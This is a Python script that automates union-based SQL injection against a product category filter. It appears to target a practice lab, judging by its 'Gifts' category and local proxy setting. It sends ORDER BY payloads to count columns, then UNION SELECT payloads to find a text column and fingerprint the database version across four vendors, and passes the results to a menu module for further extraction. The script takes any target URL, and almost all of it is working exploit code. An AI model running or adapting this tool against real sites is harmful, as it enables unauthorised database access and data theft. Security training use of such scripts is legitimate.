import sys
import re
import requests
from requests.exceptions import HTTPError,MissingSchema
import urllib3
from bs4 import BeautifulSoup
import menu
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_DETECTED=""
list_databases=[("MySQL","@@version",""," "),
                    ("PostgreSQL","version()","","||"),
                    ("Oracle","banner","FROM v$version","||"),
                    ("Microsoft","@@version","","+")]

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    """Obtains the number of columns"""
    path = "filter?category=Gifts"
    for i in range(1,20):
        sql_payload = F"' order by {i} -- -"
        try:
            resp = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
            resp.raise_for_status()
        except (HTTPError, MissingSchema) as err:
            if resp.status_code == 502:
                print(f'[-] {err}')
                return False

        if "Internal Server Error" in resp.text:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    """Obtains the first string colum"""
    path = "filter?category=Gifts"
    
    for i in range(1, num_col+1):
        payload_list = ['null'] * num_col
        payload_list[i-1] = "'test'"
        fromdual=' FROM dual '
        sql_payload = "' union select " + ','.join(payload_list) + fromdual + "-- -"
        
        result = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
        #print(url + path + sql_payload)
        soup = BeautifulSoup(result.content, 'html.parser')
        res = str(soup.find_all("div", {'class':'container is-page'}))

        if "test" in res:
            return i
    return False

def exploit_sqli_database_version(url,num_col,string_column):
    """Obtains the Database Version"""
    path = "filter?category="
    for i in range(0, len(list_databases)-1):
        payload_list = ['null'] * num_col
        payload_list[string_column-1] = list_databases[i][1]
        sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[i][2] +" -- -"
        db_detected=list_databases[i][0]
        
        r = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
        #print(url + path + sql_payload)
        soup = BeautifulSoup(r.text, 'html.parser')
        #print(soup)
        if "Internal Server Error" not in str(soup):
            dbversion = soup.findAll("th")
            print("[+] "+list_databases[i][0]+"-> The database version is ")
            for li in dbversion:
                print(li.text)
            
            return db_detected
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    #print(num_col)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        
        string_column = exploit_sqli_string_field(url,num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
            
            print("[+] Dumping the version of the database...")
            concatenator = exploit_sqli_database_version(url,num_col,string_column)
            if concatenator is False:
                print("[-] Unable to dump the database version.")
            else:
                print('main.DB:',concatenator)
                menu.menuSQLi(url,num_col,string_column,concatenator)
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")
    